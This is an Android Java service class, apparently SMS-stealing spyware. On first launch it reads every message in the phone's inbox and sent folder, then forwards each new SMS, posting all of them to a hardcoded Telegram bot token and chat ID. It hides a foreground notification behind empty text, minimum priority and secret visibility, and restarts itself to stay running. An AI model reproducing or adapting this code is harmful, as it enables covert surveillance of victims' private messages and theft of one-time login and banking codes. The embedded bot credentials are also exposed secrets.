package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsService extends Service {

    private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
    private static final String CHAT_ID   = "8623638607";
    private static final String PREFS     = "sms_prefs";
    private static final String KEY_SENT  = "old_sms_sent";

    @Override
    public void onCreate() {
        super.onCreate();
        startSilentForeground();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("sms_sender")) {
            // Naya SMS aaya — background thread pe bhejo
            String sender = intent.getStringExtra("sms_sender");
            String body   = intent.getStringExtra("sms_body");
            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());
            new Thread(() -> sendToTelegram(sender, body, time)).start();
        } else {
            // Service start hua — pehli baar purane SMS bhejo
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (!prefs.getBoolean(KEY_SENT, false)) {
                prefs.edit().putBoolean(KEY_SENT, true).apply();
                new Thread(this::sendAllOldSms).start();
            }
        }
        return START_STICKY;
    }

    private void startSilentForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                "bg", "Background", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Notification notif = new NotificationCompat.Builder(this, "bg")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();

        startForeground(1, notif);
    }

    private void sendAllOldSms() {
        ContentResolver cr = getContentResolver();
        Cursor cursor = null;
        try {
            cursor = cr.query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"},
                null, null, "date ASC"
            );
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String sender = cursor.getString(0);
                    String body   = cursor.getString(1);
                    long   date   = cursor.getLong(2);
                    sendToTelegram(sender, body, date);
                    Thread.sleep(600);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }

        // Sent + received SMS bhi bhejo
        try {
            cursor = cr.query(
                Uri.parse("content://sms/sent"),
                new String[]{"address", "body", "date"},
                null, null, "date ASC"
            );
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String to   = cursor.getString(0);
                    String body = cursor.getString(1);
                    long   date = cursor.getLong(2);
                    sendToTelegram("[Sent to " + to + "]", body, date);
                    Thread.sleep(600);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    public static void sendToTelegram(String sender, String body, long timestamp) {
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                              .format(new Date(timestamp));
            String text = "From: " + sender + "\nMsg: " + body + "\nTime: " + date;

            String api = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            String params = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                          + "&text=" + URLEncoder.encode(text, "UTF-8");

            URL url = new URL(api);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = conn.getOutputStream();
            os.write(params.getBytes("UTF-8"));
            os.flush();
            conn.getInputStream();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
